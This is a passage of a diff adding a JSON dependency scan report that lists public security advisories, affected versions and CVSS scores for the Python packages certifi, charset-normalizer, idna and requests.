+          "modified": "2026-02-04T04:37:03.387402Z",
+          "published": "2023-07-25T14:43:53Z",
+          "related": [
+            "CGA-fhcx-m79g-26vp"
+          ],
+          "database_specific": {
+            "nvd_published_at": "2023-07-25T21:15:10Z",
+            "github_reviewed": true,
+            "severity": "HIGH",
+            "cwe_ids": [
+              "CWE-345"
+            ],
+            "github_reviewed_at": "2023-07-25T14:43:53Z"
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/certifi/python-certifi/security/advisories/GHSA-xqr8-7jwr-rhp7"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37920"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/certifi/python-certifi/commit/8fb96ed81f71e7097ed11bc4d9b19afd7ea5c909"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/certifi/python-certifi"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/advisory-database/tree/main/vulns/certifi/PYSEC-2023-135.yaml"
+            },
+            {
+              "type": "WEB",
+              "url": "https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/C-HrP1SEq1A"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5EX6NG7WUFNUKGFHLM35KHHU3GAKXRTG"
+            },
+            {
+              "type": "WEB",
+              "url": "https://security.netapp.com/advisory/ntap-20240912-0002"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "certifi",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/certifi"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "2015.4.28"
+                    },
+                    {
+                      "fixed": "2023.7.22"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "2015.04.28",
+                "2015.11.20",
+                "2015.11.20.1",
+                "2015.9.6",
+                "2015.9.6.1",
+                "2015.9.6.2",
+                "2016.2.28",
+                "2016.8.2",
+                "2016.8.31",
+                "2016.8.8",
+                "2016.9.26",
+                "2017.1.23",
+                "2017.11.5",
+                "2017.4.17",
+                "2017.7.27",
+                "2017.7.27.1",
+                "2018.1.18",
+                "2018.10.15",
+                "2018.11.29",
+                "2018.4.16",
+                "2018.8.13",
+                "2018.8.24",
+                "2019.11.28",
+                "2019.3.9",
+                "2019.6.16",
+                "2019.9.11",
+                "2020.11.8",
+                "2020.12.5",
+                "2020.4.5",
+                "2020.4.5.1",
+                "2020.4.5.2",
+                "2020.6.20",
+                "2021.10.8",
+                "2021.5.30",
+                "2022.12.7",
+                "2022.5.18",
+                "2022.5.18.1",
+                "2022.6.15",
+                "2022.6.15.1",
+                "2022.6.15.2",
+                "2022.9.14",
+                "2022.9.24",
+                "2023.5.7"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/07/GHSA-xqr8-7jwr-rhp7/GHSA-xqr8-7jwr-rhp7.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+            }
+          ]
+        },
+        {
+          "id": "PYSEC-2022-42986",
+          "details": "Certifi is a curated collection of Root Certificates for validating the trustworthiness of SSL certificates while verifying the identity of TLS hosts. Certifi 2022.12.07 removes root certificates from \"TrustCor\" from the root store. These are in the process of being removed from Mozilla's trust store. TrustCor's root certificates are being removed pursuant to an investigation prompted by media reporting that TrustCor's ownership also operated a business that produced spyware. Conclusions of Mozilla's investigation can be found in the linked google group discussion.",
+          "aliases": [
+            "CVE-2022-23491",
+            "GHSA-43fp-rhv2-5gv8"
+          ],
+          "modified": "2023-11-08T04:08:19.066843Z",
+          "published": "2022-12-07T22:15:00Z",
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/oxX69KFvsm4/m/yLohoVqtCgAJ"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://github.com/certifi/python-certifi/security/advisories/GHSA-43fp-rhv2-5gv8"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "certifi",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/certifi"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "2017.11.5"
+                    },
+                    {
+                      "fixed": "2022.12.7"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "2017.11.5",
+                "2018.1.18",
+                "2018.10.15",
+                "2018.11.29",
+                "2018.4.16",
+                "2018.8.13",
+                "2018.8.24",
+                "2019.11.28",
+                "2019.3.9",
+                "2019.6.16",
+                "2019.9.11",
+                "2020.11.8",
+                "2020.12.5",
+                "2020.4.5",
+                "2020.4.5.1",
+                "2020.4.5.2",
+                "2020.6.20",
+                "2021.10.8",
+                "2021.5.30",
+                "2022.5.18",
+                "2022.5.18.1",
+                "2022.6.15",
+                "2022.6.15.1",
+                "2022.6.15.2",
+                "2022.9.14",
+                "2022.9.24"
+              ],
+              "database_specific": {
+                "source": "https://github.com/pypa/advisory-database/blob/main/vulns/certifi/PYSEC-2022-42986.yaml"
+              }
+            }
+          ],
+          "schema_version": "1.7.3"
+        },
+        {
+          "id": "PYSEC-2023-135",
+          "details": "Certifi 2023.07.22 removes root certificates from \"e-Tugra\" from the root store. These are in the process of being removed from Mozilla's trust store. e-Tugra's root certificates are being removed pursuant to an investigation prompted by reporting of security issues in their systems.",
+          "aliases": [
+            "CVE-2023-37920",
+            "GHSA-xqr8-7jwr-rhp7"
+          ],
+          "modified": "2023-11-08T04:13:04.801823Z",
+          "published": "2023-08-03T19:36:12Z",
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/C-HrP1SEq1A"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/certifi/python-certifi/commit/8fb96ed81f71e7097ed11bc4d9b19afd7ea5c909"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37920"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://github.com/certifi/python-certifi/security/advisories/GHSA-xqr8-7jwr-rhp7"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "certifi",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/certifi"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "2015.4.28"
+                    },
+                    {
+                      "fixed": "2023.7.22"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "2015.04.28",
+                "2015.11.20",
+                "2015.11.20.1",
+                "2015.9.6",
+                "2015.9.6.1",
+                "2015.9.6.2",
+                "2016.2.28",
+                "2016.8.2",
+                "2016.8.31",
+                "2016.8.8",
+                "2016.9.26",
+                "2017.1.23",
+                "2017.11.5",
+                "2017.4.17",
+                "2017.7.27",
+                "2017.7.27.1",
+                "2018.1.18",
+                "2018.10.15",
+                "2018.11.29",
+                "2018.4.16",
+                "2018.8.13",
+                "2018.8.24",
+                "2019.11.28",
+                "2019.3.9",
+                "2019.6.16",
+                "2019.9.11",
+                "2020.11.8",
+                "2020.12.5",
+                "2020.4.5",
+                "2020.4.5.1",
+                "2020.4.5.2",
+                "2020.6.20",
+                "2021.10.8",
+                "2021.5.30",
+                "2022.12.7",
+                "2022.5.18",
+                "2022.5.18.1",
+                "2022.6.15",
+                "2022.6.15.1",
+                "2022.6.15.2",
+                "2022.9.14",
+                "2022.9.24",
+                "2023.5.7"
+              ],
+              "database_specific": {
+                "source": "https://github.com/pypa/advisory-database/blob/main/vulns/certifi/PYSEC-2023-135.yaml"
+              }
+            }
+          ],
+          "schema_version": "1.7.3"
+        },
+        {
+          "id": "PYSEC-2024-230",
+          "details": "Certifi is a curated collection of Root Certificates for validating the trustworthiness of SSL certificates while verifying the identity of TLS hosts. Certifi starting in 2021.05.30 and prior to 2024.07.4 recognized root certificates from `GLOBALTRUST`. Certifi 2024.07.04 removes root certificates from `GLOBALTRUST` from the root store. These are in the process of being removed from Mozilla's trust store. `GLOBALTRUST`'s root certificates are being removed pursuant to an investigation which identified \"long-running and unresolved compliance issues.\"",
+          "aliases": [
+            "CVE-2024-39689",
+            "GHSA-248v-346w-9cwc"
+          ],
+          "modified": "2026-02-04T03:15:12.430195Z",
+          "published": "2024-07-05T19:15:10Z",
+          "related": [
+            "GHSA-248v-346w-9cwc"
+          ],
+          "references": [
+            {
+              "type": "ADVISORY",
+              "url": "https://github.com/certifi/python-certifi/security/advisories/GHSA-248v-346w-9cwc"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://security.netapp.com/advisory/ntap-20241206-0001/"
+            },
+            {
+              "type": "ARTICLE",
+              "url": "https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI"
+            },
+            {
+              "type": "FIX",
+              "url": "https://github.com/certifi/python-certifi/commit/bd8153872e9c6fc98f4023df9c2deaffea2fa463"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "certifi",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/certifi"
+              },
+              "ranges": [
+                {
+                  "type": "GIT",
+                  "repo": "https://github.com/certifi/python-certifi",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "bd8153872e9c6fc98f4023df9c2deaffea2fa463"
+                    },
+                    {
+                      "fixed": "bd8153872e9c6fc98f4023df9c2deaffea2fa463"
+                    }
+                  ]
+                },
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "2021.5.30"
+                    },
+                    {
+                      "fixed": "2024.7.4"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "2021.10.8",
+                "2021.5.30",
+                "2022.12.7",
+                "2022.5.18",
+                "2022.5.18.1",
+                "2022.6.15",
+                "2022.6.15.1",
+                "2022.6.15.2",
+                "2022.9.14",
+                "2022.9.24",
+                "2023.11.17",
+                "2023.5.7",
+                "2023.7.22",
+                "2024.2.2",
+                "2024.6.2"
+              ],
+              "database_specific": {
+                "source": "https://github.com/pypa/advisory-database/blob/main/vulns/certifi/PYSEC-2024-230.yaml"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+            }
+          ]
+        }
+      ],
+      "vulnerability_count": 6,
+      "has_vulnerabilities": true,
+      "query_time": "2026-03-05T18:11:28.681497"
+    },
+    {
+      "name": "charset-normalizer",
+      "version": "2.0.10",
+      "purl": "pkg:pypi/charset-normalizer@2.0.10",
+      "type": "library",
+      "bom-ref": "pkg:pypi/charset-normalizer@2.0.10",
+      "group": "",
+      "description": "The Real First Universal Charset Detector. Open, modern and actively maintained alternative to Chardet.",
+      "licenses": [
+        {
+          "license": {
+            "id": "MIT",
+            "url": "https://opensource.org/licenses/MIT"
+          }
+        }
+      ],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 1,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/scripts/requirements.txt"
+              },
+              {
+                "technique": "instrumentation",
+                "confidence": 1,
+                "value": "cdxgen-venv-3Xn6F4"
+              }
+            ]
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "SrcFile",
+          "value": "data/repos/public-apis_public-apis/scripts/requirements.txt"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681504"
+    },
+    {
+      "name": "idna",
+      "version": "3.3",
+      "purl": "pkg:pypi/idna@3.3",
+      "type": "library",
+      "bom-ref": "pkg:pypi/idna@3.3",
+      "group": "",
+      "description": "Internationalized Domain Names in Applications (IDNA)",
+      "licenses": [
+        {
+          "license": {
+            "id": "0BSD",
+            "url": "https://opensource.org/licenses/0BSD"
+          }
+        },
+        {
+          "license": {
+            "id": "BSD-3-Clause",
+            "url": "https://opensource.org/licenses/BSD-3-Clause"
+          }
+        }
+      ],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 1,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/scripts/requirements.txt"
+              },
+              {
+                "technique": "instrumentation",
+                "confidence": 1,
+                "value": "cdxgen-venv-3Xn6F4"
+              }
+            ]
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "SrcFile",
+          "value": "data/repos/public-apis_public-apis/scripts/requirements.txt"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "id": "GHSA-jjg7-2v4v-x38h",
+          "summary": "Internationalized Domain Names in Applications (IDNA) vulnerable to denial of service from specially crafted inputs to idna.encode",
+          "details": "### Impact\nA specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.\n\n### Patches\nThe function has been refined to reject such strings without the associated resource consumption in version 3.7.\n\n### Workarounds\nDomain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.\n\n### References\n* https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb",
+          "aliases": [
+            "CVE-2024-3651",
+            "PYSEC-2024-60"
+          ],
+          "modified": "2026-02-04T03:49:45.087439Z",
+          "published": "2024-04-11T21:32:40Z",
+          "related": [
+            "CGA-hp6r-9hv6-83rp"
+          ],
+          "database_specific": {
+            "github_reviewed_at": "2024-04-11T21:32:40Z",
+            "github_reviewed": true,
+            "cwe_ids": [
+              "CWE-1333",
+              "CWE-400"
+            ],
+            "nvd_published_at": "2024-07-07T18:15:09Z",
+            "severity": "MODERATE"
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/kjd/idna/security/advisories/GHSA-jjg7-2v4v-x38h"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-3651"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/kjd/idna/commit/1d365e17e10d72d0b7876316fc7b9ca0eebdd38d"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/kjd/idna"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/advisory-database/tree/main/vulns/idna/PYSEC-2024-60.yaml"
+            },
+            {
+              "type": "WEB",
+              "url": "https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.debian.org/debian-lts-announce/2024/05/msg00006.html"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4YQUPYH3SVZ5GFF2CDQ55FCM575AZTF2"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/F2S5E23N6E52S46KGNYTDFB75LOC4N4D"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/S5IDLLD2IKSIVRBSLB34WTSYGLMWUFWF"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ULSC7HBJKXB3BZV367WM5BR6DFEC4Z43"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "idna",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/idna"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "3.7"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "0.1",
+                "0.2",
+                "0.3",
+                "0.4",
+                "0.5",
+                "0.6",
+                "0.7",
+                "0.8",
+                "0.9",
+                "1.0",
+                "1.1",
+                "2.0",
+                "2.1",
+                "2.10",
+                "2.2",
+                "2.3",
+                "2.4",
+                "2.5",
+                "2.6",
+                "2.7",
+                "2.8",
+                "2.9",
+                "3.0",
+                "3.1",
+                "3.2",
+                "3.3",
+                "3.4",
+                "3.5",
+                "3.6"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-jjg7-2v4v-x38h/GHSA-jjg7-2v4v-x38h.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            },
+            {
+              "type": "CVSS_V4",
+              "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+            }
+          ]
+        },
+        {
+          "id": "PYSEC-2024-60",
+          "details": "A vulnerability was identified in the kjd/idna library, specifically within the `idna.encode()` function, affecting version 3.6. The issue arises from the function's handling of crafted input strings, which can lead to quadratic complexity and consequently, a denial of service condition. This vulnerability is triggered by a crafted input that causes the `idna.encode()` function to process the input with considerable computational load, significantly increasing the processing time in a quadratic manner relative to the input size.",
+          "aliases": [
+            "CVE-2024-3651",
+            "GHSA-jjg7-2v4v-x38h"
+          ],
+          "modified": "2024-07-11T17:42:33.704488Z",
+          "published": "2024-07-07T18:15:00Z",
+          "references": [
+            {
+              "type": "FIX",
+              "url": "https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb"
+            },
+            {
+              "type": "FIX",
+              "url": "https://github.com/kjd/idna/commit/1d365e17e10d72d0b7876316fc7b9ca0eebdd38d"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "idna",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/idna"
+              },
+              "ranges": [
+                {
+                  "type": "GIT",
+                  "repo": "https://github.com/kjd/idna",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "1d365e17e10d72d0b7876316fc7b9ca0eebdd38d"
+                    }
+                  ]
+                },
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "0.1"
+                    },
+                    {
+                      "fixed": "3.7"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "0.1",
+                "0.2",
+                "0.3",
+                "0.4",
+                "0.5",
+                "0.6",
+                "0.7",
+                "0.8",
+                "0.9",
+                "1.0",
+                "1.1",
+                "2.0",
+                "2.1",
+                "2.10",
+                "2.2",
+                "2.3",
+                "2.4",
+                "2.5",
+                "2.6",
+                "2.7",
+                "2.8",
+                "2.9",
+                "3.0",
+                "3.1",
+                "3.2",
+                "3.3",
+                "3.4",
+                "3.5",
+                "3.6"
+              ],
+              "database_specific": {
+                "source": "https://github.com/pypa/advisory-database/blob/main/vulns/idna/PYSEC-2024-60.yaml"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            }
+          ]
+        }
+      ],
+      "vulnerability_count": 2,
+      "has_vulnerabilities": true,
+      "query_time": "2026-03-05T18:11:28.681512"
+    },
+    {
+      "name": "requests",
+      "version": "2.27.1",
+      "purl": "pkg:pypi/requests@2.27.1",
+      "type": "library",
+      "bom-ref": "pkg:pypi/requests@2.27.1",
+      "group": "",
+      "description": "Python HTTP for Humans.",
+      "licenses": [
+        {
+          "license": {
+            "id": "Apache-2.0",
+            "url": "https://opensource.org/licenses/Apache-2.0"
+          }
+        }
+      ],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 1,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/scripts/requirements.txt"
+              },
+              {
+                "technique": "instrumentation",
+                "confidence": 1,
+                "value": "cdxgen-venv-3Xn6F4"
+              }
+            ]
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "SrcFile",
+          "value": "data/repos/public-apis_public-apis/scripts/requirements.txt"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "id": "GHSA-9hjg-9r4m-mvj7",
+          "summary": "Requests vulnerable to .netrc credentials leak via malicious URLs",
+          "details": "### Impact\n\nDue to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.\n\n### Workarounds\nFor older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).\n\n### References\nhttps://github.com/psf/requests/pull/6965\nhttps://seclists.org/fulldisclosure/2025/Jun/2",
+          "aliases": [
+            "CVE-2024-47081"
+          ],
+          "modified": "2026-02-04T03:44:00.676479Z",
+          "published": "2025-06-09T19:06:08Z",
+          "related": [
+            "CGA-62pf-wv72-jrw9"
+          ],
+          "database_specific": {
+            "nvd_published_at": "2025-06-09T18:15:24Z",
+            "severity": "MODERATE",
+            "github_reviewed": true,
+            "github_reviewed_at": "2025-06-09T19:06:08Z",
+            "cwe_ids": [
+              "CWE-522"
+            ]
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47081"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/psf/requests/pull/6965"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/psf/requests/commit/96ba401c1296ab1dda74a2365ef36d88f7d144ef"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/psf/requests"
+            },
+            {
+              "type": "WEB",
+              "url": "https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env"
+            },
+            {
+              "type": "WEB",
+              "url": "https://seclists.org/fulldisclosure/2025/Jun/2"
+            },
+            {
+              "type": "WEB",
+              "url": "http://seclists.org/fulldisclosure/2025/Jun/2"
+            },
+            {
+              "type": "WEB",
+              "url": "http://www.openwall.com/lists/oss-security/2025/06/03/11"
+            },
+            {
+              "type": "WEB",
+              "url": "http://www.openwall.com/lists/oss-security/2025/06/03/9"
+            },
+            {
+              "type": "WEB",
+              "url": "http://www.openwall.com/lists/oss-security/2025/06/04/1"
+            },
+            {
+              "type": "WEB",
+              "url": "http://www.openwall.com/lists/oss-security/2025/06/04/6"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "requests",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/requests"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "2.32.4"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "0.0.1",
+                "0.10.0",
+                "0.10.1",
+                "0.10.2",
+                "0.10.3",
+                "0.10.4",
+                "0.10.6",
+                "0.10.7",
+                "0.10.8",
+                "0.11.1",
+                "0.11.2",
+                "0.12.0",
+                "0.12.01",
+                "0.12.1",
+                "0.13.0",
+                "0.13.1",
+                "0.13.2",
+                "0.13.3",
+                "0.13.4",
+                "0.13.5",
+                "0.13.6",
+                "0.13.7",
+                "0.13.8",
+                "0.13.9",
+                "0.14.0",
+                "0.14.1",
+                "0.14.2",
+                "0.2.0",
+                "0.2.1",
+                "0.2.2",
+                "0.2.3",
+                "0.2.4",
+                "0.3.0",
+                "0.3.1",
+                "0.3.2",
+                "0.3.3",
+                "0.3.4",
+                "0.4.0",
+                "0.4.1",
+                "0.5.0",
+                "0.5.1",
+                "0.6.0",
+                "0.6.1",
+                "0.6.2",
+                "0.6.3",
+                "0.6.4",
+                "0.6.5",
+                "0.6.6",
+                "0.7.0",
+                "0.7.1",
+                "0.7.2",
+                "0.7.3",
+                "0.7.4",
+                "0.7.5",
+                "0.7.6",
+                "0.8.0",
+                "0.8.1",
+                "0.8.2",
+                "0.8.3",
+                "0.8.4",
+                "0.8.5",
+                "0.8.6",
+                "0.8.7",
+                "0.8.8",
+                "0.8.9",
+                "0.9.0",
+                "0.9.1",
+                "0.9.2",
+                "0.9.3",
+                "1.0.0",
+                "1.0.1",
+                "1.0.2",
+                "1.0.3",
+                "1.0.4",
+                "1.1.0",
+                "1.2.0",
+                "1.2.1",
+                "1.2.2",
+                "1.2.3",
+                "2.0.0",
+                "2.0.1",
+                "2.1.0",
+                "2.10.0",
+                "2.11.0",
+                "2.11.1",
+                "2.12.0",
+                "2.12.1",
+                "2.12.2",
+                "2.12.3",
+                "2.12.4",
+                "2.12.5",
+                "2.13.0",
+                "2.14.0",
+                "2.14.1",
+                "2.14.2",
+                "2.15.0",
+                "2.15.1",
+                "2.16.0",
+                "2.16.1",
+                "2.16.2",
+                "2.16.3",
+                "2.16.4",
+                "2.16.5",
+                "2.17.0",
+                "2.17.1",
+                "2.17.2",
+                "2.17.3",
+                "2.18.0",
+                "2.18.1",
+                "2.18.2",
+                "2.18.3",
+                "2.18.4",
+                "2.19.0",
+                "2.19.1",
+                "2.2.0",
+                "2.2.1",
+                "2.20.0",
+                "2.20.1",
+                "2.21.0",
+                "2.22.0",
+                "2.23.0",
+                "2.24.0",
+                "2.25.0",
+                "2.25.1",
+                "2.26.0",
+                "2.27.0",
+                "2.27.1",
+                "2.28.0",
+                "2.28.1",
+                "2.28.2",
+                "2.29.0",
+                "2.3.0",
+                "2.30.0",
+                "2.31.0",
+                "2.32.0",
+                "2.32.1",
+                "2.32.2",
+                "2.32.3",
+                "2.4.0",
+                "2.4.1",
+                "2.4.2",
+                "2.4.3",
+                "2.5.0",
+                "2.5.1",
+                "2.5.2",
+                "2.5.3",
+                "2.6.0",
+                "2.6.1",
+                "2.6.2",
+                "2.7.0",
+                "2.8.0",
+                "2.8.1",
+                "2.9.0",
+                "2.9.1",
+                "2.9.2"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-9hjg-9r4m-mvj7/GHSA-9hjg-9r4m-mvj7.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+            }
+          ]
+        },
+        {
+          "id": "GHSA-9wx4-h78v-vm56",
+          "summary": "Requests `Session` object does not verify requests after making first request with verify=False",
+          "details": "When using a `requests.Session`, if the first request to a given origin is made with `verify=False`, TLS certificate verification may remain disabled for all subsequent requests to that origin, even if `verify=True` is explicitly specified later.\n\nThis occurs because the underlying connection is reused from the session's connection pool, causing the initial TLS verification setting to persist for the lifetime of the pooled connection. As a result, applications may unintentionally send requests without certificate verification, leading to potential man-in-the-middle attacks and compromised confidentiality or integrity.\n\nThis behavior affects versions of `requests` prior to 2.32.0.",
+          "aliases": [
+            "CVE-2024-35195"
+          ],
+          "modified": "2026-02-04T02:43:42.271895Z",
+          "published": "2024-05-20T20:15:00Z",
+          "related": [
+            "CGA-h732-75mv-vfrp"
+          ],
+          "database_specific": {
+            "github_reviewed_at": "2024-05-20T20:15:00Z",
+            "severity": "MODERATE",
+            "nvd_published_at": "2024-05-20T21:15:09Z",
+            "github_reviewed": true,
+            "cwe_ids": [
+              "CWE-670"
+            ]
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-35195"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/psf/requests/pull/6655"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/psf/requests/commit/a58d7f2ffb4d00b46dca2d70a3932a0b37e22fac"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/psf/requests"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IYLSNK5TL46Q6XPRVMHVWS63MVJQOK4Q"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/N7WP6EYDSUOCOJYHDK5NX43PYZ4SNHGZ"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "requests",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/requests"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "2.32.0"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "0.0.1",
+                "0.10.0",
+                "0.10.1",
+                "0.10.2",
+                "0.10.3",
+                "0.10.4",
+                "0.10.6",
+                "0.10.7",
+                "0.10.8",
+                "0.11.1",
+                "0.11.2",
+                "0.12.0",
+                "0.12.01",
+                "0.12.1",
+                "0.13.0",
+                "0.13.1",
+                "0.13.2",
+                "0.13.3",
+                "0.13.4",
+                "0.13.5",
+                "0.13.6",
+                "0.13.7",
+                "0.13.8",
+                "0.13.9",
+                "0.14.0",
+                "0.14.1",
+                "0.14.2",
+                "0.2.0",
+                "0.2.1",
+                "0.2.2",
+                "0.2.3",
